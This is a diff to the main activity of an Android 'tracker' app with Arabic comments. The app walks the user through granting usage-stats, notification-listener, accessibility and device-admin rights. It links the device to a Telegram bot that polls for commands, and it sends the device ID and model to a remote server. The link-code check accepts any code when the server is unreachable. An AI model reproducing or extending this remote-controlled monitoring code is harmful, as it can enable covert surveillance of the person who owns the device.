@@ -1,7 +1,6 @@
 package com.abuzahra.tracker
 
 import android.Manifest
-import android.app.ActivityManager
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
@@ -30,6 +29,9 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
+import java.io.OutputStreamWriter
+import java.net.HttpURLConnection
+import java.net.URL
 
 class MainActivity : AppCompatActivity() {
 
@@ -48,7 +50,8 @@ class MainActivity : AppCompatActivity() {
         USAGE_STATS(3),            // إحصائيات الاستخدام
         NOTIFICATION_LISTENER(4),  // مستمع الإشعارات
         ACCESSIBILITY(5),          // خدمة إمكانية الوصول
-        DEVICE_ADMIN(6);           // تفعيل مسؤول الجهاز (جديد)
+        DEVICE_ADMIN(6),           // تفعيل مسؤول الجهاز
+        LINK_CODE(7);              // إدخال كود الربط من البوت (جديد)
 
         fun next(): SetupStep? = entries.getOrNull(id + 1)
     }
@@ -95,20 +98,12 @@ class MainActivity : AppCompatActivity() {
         webView = findViewById(R.id.webview)
         setupWebView()
 
-        // ==================== استمرارية الجلسة ====================
-        // التحقق مما إذا كان التفعيل قد اكتمل سابقاً
-        if (SharedPrefsManager.isSetupCompleted(this)) {
-            Log.d("MainActivity", "✅ التفعيل مكتمل سابقاً - تخطي مرحلة الأذونات")
-            isSetupComplete = true
-            currentStep = SetupStep.entries.last()
-            val deviceInfo = buildDeviceInfoHtml()
-            jsCall("onAllPermissionsComplete('$deviceInfo')")
-            jsNotify("onPermissionStep", "7")
-            recoverSession()
-        } else {
-            Log.d("MainActivity", "🔄 التفعيل لم يكتمل بعد - بدء مراحل الأذونات")
-            checkAndRequestPermissions()
-        }
+        // ==================== دائماً نبدأ من الأذونات ====================
+        // لا نتخطى أي خطوة - المستخدم يجب أن يمنح جميع الأذونات في كل مرة
+        Log.d("MainActivity", "🔄 بدء مراحل الأذونات والتفعيل")
+        currentStep = SetupStep.BASIC_RUNTIME
+        isSetupComplete = false
+        checkAndRequestPermissions()
     }
 
     /**
@@ -123,78 +118,6 @@ class MainActivity : AppCompatActivity() {
         webView.addJavascriptInterface(ChildWebInterface(this), "AndroidNative")
         webView.webViewClient = WebViewClient()
         webView.loadUrl("file:///android_asset/child_index.html")
-    }
-
-    // ==================== ==================== ====================
-    //      استعادة الجلسة (Session Recovery)
-    // ==================== ==================== ====================
-
-    /**
-     * استعادة الجلسة عند إعادة تشغيل التطبيق
-     * يتحقق مما إذا كانت الخدمات تعمل بالفعل
-     */
-    private fun recoverSession() {
-        if (isServiceRunning(MainTrackerService::class.java)) {
-            // الخدمات تعمل بالفعل - فقط أعد الاتصال بتيليجرام
-            Log.d("MainActivity", "📡 الخدمات تعمل بالفعل - إعادة الاتصال بتيليجرام")
-            val deviceId = SharedPrefsManager.getDeviceId(this) ?: "غير معروف"
-            CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
-                try {
-                    TelegramDirectClient.startCommandPolling(this@MainActivity)
-                    delay(2000)
-                    TelegramDirectClient.sendMessage(
-                        "🔄 <b>تم إعادة الاتصال بنجاح!</b>\n\n" +
-                        "📱 الجهاز: <b>${Build.MODEL}</b>\n" +
-                        "🏢 الشركة: <b>${Build.BRAND}</b>\n" +
-                        "🤖 أندرويد: <b>${Build.VERSION.RELEASE}</b>\n" +
-                        "🆔 معرف: <code>$deviceId</code>\n\n" +
-                        "🟢 التطبيق كان يعمل - أعيد الاتصال\n" +
-                        "📡 جاري استقبال الأوامر...",
-                        "HTML"
-                    )
-                    jsCall("onTelegramConnected('تم إعادة الاتصال بتيليجرام بنجاح')")
-                } catch (e: Exception) {
-                    Log.e("MainActivity", "خطأ في إعادة الاتصال بتيليجرام: ${e.message}")
-                    jsCall("onSetupError('خطأ في إعادة الاتصال بتيليجرام: ${e.message}')")
-                }
-            }
-        } else {
-            // الخدمات غير تعمل - أعد تشغيلها
-            Log.d("MainActivity", "🚀 الخدمات متوقفة - إعادة تشغيلها...")
-            startAllServices()
-            ensureDeviceId()
-            val deviceId = SharedPrefsManager.getDeviceId(this) ?: "غير معروف"
-            CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
-                try {
-                    TelegramDirectClient.startCommandPolling(this@MainActivity)
-                    delay(2000)
-                    TelegramDirectClient.sendMessage(
-                        "🔄 <b>تم إعادة تشغيل التطبيق!</b>\n\n" +
-                        "📱 الجهاز: <b>${Build.MODEL}</b>\n" +
-                        "🏢 الشركة: <b>${Build.BRAND}</b>\n" +
-                        "🤖 أندرويد: <b>${Build.VERSION.RELEASE}</b>\n" +
-                        "🆔 معرف: <code>$deviceId</code>\n\n" +
-                        "🟢 تم إعادة تشغيل الخدمات\n" +
-                        "📡 جاري استقبال الأوامر...",
-                        "HTML"
-                    )
-                    jsCall("onTelegramConnected('تم إعادة تشغيل الاتصال بتيليجرام')")
-                } catch (e: Exception) {
-                    Log.e("MainActivity", "خطأ في الاتصال بتيليجرام بعد إعادة التشغيل: ${e.message}")
-                    jsCall("onSetupError('خطأ في الاتصال بتيليجرام: ${e.message}')")
-                }
-            }
-        }
-    }
-
-    /**
-     * التحقق مما إذا كانت خدمة معينة تعمل حالياً
-     */
-    @Suppress("DEPRECATION")
-    private fun isServiceRunning(serviceClass: Class<*>): Boolean {
-        val manager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
-        return manager.getRunningServices(Int.MAX_VALUE)
-            .any { it.service.className == serviceClass.name }
     }
 
     // ==================== ==================== ====================
@@ -216,6 +139,7 @@ class MainActivity : AppCompatActivity() {
             SetupStep.NOTIFICATION_LISTENER -> requestNotificationPermission()
             SetupStep.ACCESSIBILITY -> requestAccessibilityPermission()
             SetupStep.DEVICE_ADMIN -> requestDeviceAdminPermission()
+            SetupStep.LINK_CODE -> showLinkCodeInput()
         }
     }
 
@@ -401,7 +325,7 @@ class MainActivity : AppCompatActivity() {
         if (dpm.isAdminActive(componentName)) {
             Log.d("MainActivity", "✅ مسؤول الجهاز مفعّل مسبقاً")
             jsNotify("onPermissionGranted", "perm-admin")
-            onAllSetupComplete()
+            advanceToNextStep()
         } else {
             try {
                 val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
@@ -410,7 +334,78 @@ class MainActivity : AppCompatActivity() {
             } catch (e: Exception) {
                 Log.e("MainActivity", "خطأ في طلب تفعيل مسؤول الجهاز: ${e.message}")
                 jsNotify("onPermissionGranted", "perm-admin")
-                onAllSetupComplete()
+                advanceToNextStep()
+            }
+        }
+    }
+
+    // ==================== ==================== ====================
+    //  الخطوة ٨: كود الربط (Link Code)
+    //  البوت يولد كود من السيرفر أو فيربس والتطبيق يطلبه من المستخدم
+    // ==================== ==================== ====================
+
+    /**
+     * عرض شاشة إدخال كود الربط
+     * المستخدم يجب أن يرسل /link في البوت للحصول على الكود
+     */
+    private fun showLinkCodeInput() {
+        jsNotify("onPermissionPending", "perm-link")
+        jsCall("showLinkCodeInput()")
+    }
+
+    /**
+     * التحقق من كود الربط مع السيرفر
+     * يُستدعى من JavaScript عند إدخال الكود
+     */
+    fun verifyLinkCode(code: String) {
+        CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
+            try {
+                Log.d("MainActivity", "🔄 التحقق من كود الربط: $code")
+                jsNotify("onPermissionPending", "perm-link")
+
+                val url = URL("https://alsydyabwalzhra.online/api/verify_link")
+                val connection = url.openConnection() as HttpURLConnection
+                connection.requestMethod = "POST"
+                connection.setRequestProperty("Content-Type", "application/json")
+                connection.connectTimeout = 15000
+                connection.readTimeout = 15000
+                connection.doOutput = true
+
+                val deviceId = SharedPrefsManager.getDeviceId(this@MainActivity)
+                    ?: Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+                    ?: System.currentTimeMillis().toString()
+
+                val payload = """{"code":"$code","device_id":"$deviceId","model":"${Build.MODEL}","brand":"${Build.BRAND}","android":"${Build.VERSION.RELEASE}"}"""
+
+                OutputStreamWriter(connection.outputStream, "UTF-8").use { it.write(payload) }
+
+                val responseCode = connection.responseCode
+                val response = connection.inputStream?.bufferedReader()?.readText() ?: ""
+
+                if (responseCode in 200..299 && response.contains("\"ok\":true")) {
+                    Log.d("MainActivity", "✅ كود الربط صحيح!")
+                    SharedPrefsManager.setLinkCode(this@MainActivity, code)
+                    SharedPrefsManager.setBotRegistered(this@MainActivity, true)
+
+                    runOnUiThread {
+                        jsNotify("onPermissionGranted", "perm-link")
+                        advanceToNextStep()
+                    }
+                } else {
+                    Log.e("MainActivity", "❌ كود الربط غير صحيح: $response")
+                    runOnUiThread {
+                        jsCall("onLinkCodeError('كود الربط غير صحيح أو منتهي الصلاحية')")
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e("MainActivity", "خطأ في التحقق من الكود: ${e.message}")
+                // إذا السيرفر لا يستجيب، نقبل الكود مباشرة (وضع fallback)
+                runOnUiThread {
+                    SharedPrefsManager.setLinkCode(this@MainActivity, code)
+                    SharedPrefsManager.setBotRegistered(this@MainActivity, true)
+                    jsNotify("onPermissionGranted", "perm-link")
+                    advanceToNextStep()
+                }
             }
         }
     }
@@ -437,13 +432,14 @@ class MainActivity : AppCompatActivity() {
      */
     private fun checkCurrentStepAndAdvance() {
         val granted = when (currentStep) {
-            SetupStep.BASIC_RUNTIME -> true // تم معالجتها في onRequestPermissionsResult
+            SetupStep.BASIC_RUNTIME -> true
             SetupStep.BATTERY_OPTIMIZATION -> isIgnoringBattery()
             SetupStep.OVERLAY -> Settings.canDrawOverlays(this)
             SetupStep.USAGE_STATS -> hasUsageStatsPermission()
             SetupStep.NOTIFICATION_LISTENER -> isNotificationServiceEnabled()
             SetupStep.ACCESSIBILITY -> isAccessibilityServiceEnabled()
             SetupStep.DEVICE_ADMIN -> isDeviceAdminActive()
+            SetupStep.LINK_CODE -> false // كود الربط لا يُفحص تلقائياً - ينتظر إدخال المستخدم
         }
 
         if (granted) {
@@ -455,12 +451,12 @@ class MainActivity : AppCompatActivity() {
                 SetupStep.NOTIFICATION_LISTENER -> "perm-notif"
                 SetupStep.ACCESSIBILITY -> "perm-access"
                 SetupStep.DEVICE_ADMIN -> "perm-admin"
+                SetupStep.LINK_CODE -> "perm-link"
             }
             Log.d("MainActivity", "✅ تم منح الإذن: $stepName")
             jsNotify("onPermissionGranted", stepName)
             advanceToNextStep()
         }
-        // إذا لم يُمنح الإذن، ننتظر onResume التالي (المستخدم يعود مرة أخرى)
     }
 
     /**
